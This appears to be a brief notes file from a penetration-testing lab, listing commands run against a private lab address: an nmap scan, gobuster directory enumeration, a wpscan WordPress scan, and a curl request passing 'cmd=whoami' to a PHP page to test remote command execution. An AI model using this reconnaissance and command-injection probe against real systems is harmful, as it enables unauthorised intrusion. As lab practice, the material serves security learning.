# Commands Used

## Nmap Scan
```bash
nmap -sS -sV -O 192.168.56.106
```

## Directory Enumeration
```bash
gobuster dir -u http://192.168.56.106 -w /usr/share/wordlists/dirb/common.txt
```

## WordPress Enumeration
```bash
wpscan --url http://192.168.56.106
```

## Command Execution Test
```bash
curl "http://192.168.56.106/secret/index.php/doesnotexist?cmd=whoami"
```
